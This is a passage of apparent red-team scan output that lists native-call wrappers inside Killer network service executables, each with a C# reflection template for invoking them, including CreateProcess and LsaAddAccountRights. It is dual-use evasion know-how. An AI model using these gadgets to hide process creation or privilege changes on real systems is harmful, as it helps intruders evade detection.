        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""SetStdHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { int device, IntPtr handle });
        ===END SIGNATURE===

Method: CreateProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""CreateProcess"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO& lpStartupInfo, PROCESS_INFORMATION& lpProcessInformation });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: AttachConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""AttachConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { uint dwProcessId });
        ===END SIGNATURE===

Method: FreeConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FreeConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetConsoleCtrlHandler
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""SetConsoleCtrlHandler"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { ConsoleCtrlDelegate HandlerRoutine, bool Add });
        ===END SIGNATURE===

Method: GenerateConsoleCtrlEvent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""GenerateConsoleCtrlEvent"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { CtrlTypes dwCtrlEvent, uint dwProcessGroupId });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KillerLU.exe

Method: FreeConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KillerLU.exe"");
        Type t = asm.GetType(""KillerLU.KillerLU"", true);
        var methodInfo = t.GetMethod(""FreeConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: AllocConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KillerLU.exe"");
        Type t = asm.GetType(""KillerLU.KillerLU"", true);
        var methodInfo = t.GetMethod(""AllocConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, IntPtr lpInfo });
        ===END SIGNATURE===

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, SERVICE_FAILURE_ACTIONS& sfa });
        ===END SIGNATURE===

Method: OpenSCManager
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenSCManager"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string machineName, string databaseName, uint dwAccess });
        ===END SIGNATURE===

Method: OpenService
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenService"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess });
        ===END SIGNATURE===

Method: CloseServiceHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""CloseServiceHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hSCObject });
        ===END SIGNATURE===

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hServiceStatus, SERVICE_STATUS& lpServiceStatus });
        ===END SIGNATURE===

Method: LsaOpenPolicy
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaOpenPolicy"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { LSA_UNICODE_STRING& SystemName, LSA_OBJECT_ATTRIBUTES& ObjectAttributes, int DesiredAccess, IntPtr& PolicyHandle });
        ===END SIGNATURE===

Method: LsaAddAccountRights
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaAddAccountRights"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr PolicyHandle, IntPtr AccountSid, LSA_UNICODE_STRING[] UserRights, uint CountOfRights });
        ===END SIGNATURE===

Method: FreeSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""FreeSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LookupAccountName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LookupAccountName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpSystemName, string lpAccountName, IntPtr psid, Int32& cbsid, StringBuilder domainName, Int32& cbdomainLength, Int32& use });
        ===END SIGNATURE===

Method: IsValidSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""IsValidSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LsaClose
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaClose"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr ObjectHandle });
        ===END SIGNATURE===

Method: LsaNtStatusToWinError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaNtStatusToWinError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { uint status });
        ===END SIGNATURE===

Method: SetStdHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""SetStdHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { int device, IntPtr handle });
        ===END SIGNATURE===

Method: CreateProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""CreateProcess"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO& lpStartupInfo, PROCESS_INFORMATION& lpProcessInformation });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: AttachConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""AttachConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { uint dwProcessId });
        ===END SIGNATURE===

Method: FreeConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FreeConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetConsoleCtrlHandler
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""SetConsoleCtrlHandler"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { ConsoleCtrlDelegate HandlerRoutine, bool Add });
        ===END SIGNATURE===

Method: GenerateConsoleCtrlEvent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""GenerateConsoleCtrlEvent"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { CtrlTypes dwCtrlEvent, uint dwProcessGroupId });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, IntPtr lpInfo });
        ===END SIGNATURE===

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, SERVICE_FAILURE_ACTIONS& sfa });
        ===END SIGNATURE===

Method: OpenSCManager
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenSCManager"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string machineName, string databaseName, uint dwAccess });
        ===END SIGNATURE===

Method: OpenService
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenService"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess });
        ===END SIGNATURE===

Method: CloseServiceHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""CloseServiceHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hSCObject });
        ===END SIGNATURE===

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hServiceStatus, SERVICE_STATUS& lpServiceStatus });
        ===END SIGNATURE===

Method: LsaOpenPolicy
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaOpenPolicy"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { LSA_UNICODE_STRING& SystemName, LSA_OBJECT_ATTRIBUTES& ObjectAttributes, int DesiredAccess, IntPtr& PolicyHandle });
        ===END SIGNATURE===

Method: LsaAddAccountRights
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaAddAccountRights"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr PolicyHandle, IntPtr AccountSid, LSA_UNICODE_STRING[] UserRights, uint CountOfRights });
        ===END SIGNATURE===

Method: FreeSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""FreeSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LookupAccountName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LookupAccountName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpSystemName, string lpAccountName, IntPtr psid, Int32& cbsid, StringBuilder domainName, Int32& cbdomainLength, Int32& use });
        ===END SIGNATURE===

Method: IsValidSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""IsValidSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LsaClose
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaClose"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr ObjectHandle });
        ===END SIGNATURE===

Method: LsaNtStatusToWinError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaNtStatusToWinError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { uint status });
        ===END SIGNATURE===

Method: SetStdHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""SetStdHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { int device, IntPtr handle });
        ===END SIGNATURE===

Method: CreateProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""CreateProcess"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO& lpStartupInfo, PROCESS_INFORMATION& lpProcessInformation });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: AttachConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""AttachConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { uint dwProcessId });
        ===END SIGNATURE===

Method: FreeConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FreeConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetConsoleCtrlHandler
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""SetConsoleCtrlHandler"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { ConsoleCtrlDelegate HandlerRoutine, bool Add });
        ===END SIGNATURE===

Method: GenerateConsoleCtrlEvent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""GenerateConsoleCtrlEvent"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { CtrlTypes dwCtrlEvent, uint dwProcessGroupId });
        ===END SIGNATURE===
-------------
-------------
